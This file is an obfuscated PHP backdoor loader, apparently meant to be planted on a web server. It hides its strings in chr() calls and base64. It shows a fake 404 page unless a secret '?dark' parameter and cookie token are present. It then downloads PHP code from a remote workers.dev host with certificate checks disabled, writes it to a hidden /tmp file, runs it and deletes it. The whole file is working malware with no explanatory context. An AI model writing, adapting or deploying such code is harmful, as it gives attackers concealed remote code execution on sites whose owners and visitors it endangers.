<?php
$_0=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);
$_1=['ZGFyaw==','NjE4MjdkZDY2MWFiOTQyZGQzMmQ4ZmE5ZTRkZmYwYWI=','aHR0cHM6Ly90LXNpbGVudHYyLm5pYnJhcy1zdWFkLndvcmtlcnMuZGV2P2tleT1kYXJr'];
$_2=$_0($_1[0]);$_3=$_0($_1[1]);
if(isset($_GET[$_2])){$_COOKIE['_t']=$_3;setcookie('_t',$_3,time()+86400,'/');}
if(!isset($_COOKIE['_t'])||$_COOKIE['_t']!==$_3){http_response_code(404);die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>');}
$_4=$_0($_1[2]);
$_cf=function($u){
    if(function_exists('curl_init')){$ch=curl_init($u);curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>1,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_SSL_VERIFYPEER=>0,CURLOPT_SSL_VERIFYHOST=>0,CURLOPT_USERAGENT=>'Mozilla/5.0',CURLOPT_TIMEOUT=>30]);$r=curl_exec($ch);curl_close($ch);return $r;}
    return @file_get_contents($u,false,stream_context_create(['http'=>['timeout'=>30],'ssl'=>['verify_peer'=>false]]));
};
$_d=$_cf($_4);
if($_d&&strpos($_d,'<?')!==false){
    @chdir(dirname($_SERVER['SCRIPT_FILENAME']));
    $_t='/tmp/.'.md5(microtime(true).mt_rand()).'.php';
    @file_put_contents($_t,$_d);
    @include($_t);
    @unlink($_t);
}
